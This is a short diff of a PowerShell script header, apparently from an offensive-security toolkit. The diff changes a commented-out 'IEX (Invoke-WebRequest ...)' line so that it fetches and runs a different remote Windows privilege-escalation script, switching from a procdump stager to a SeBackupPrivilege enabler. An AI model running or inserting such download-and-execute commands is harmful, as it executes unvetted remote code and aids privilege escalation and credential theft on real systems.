@@ -1,4 +1,4 @@
-#IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/stager-procdump.ps1")
+#IEX (Invoke-WebRequest -Uri "https://github.com/paulkwalton/thescriptvault/raw/refs/heads/main/privesc/windows/SeBackupPrivilege/enable-SeBackup.ps1")
 # Ensure TLS 1.2 is used for secure downloads
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
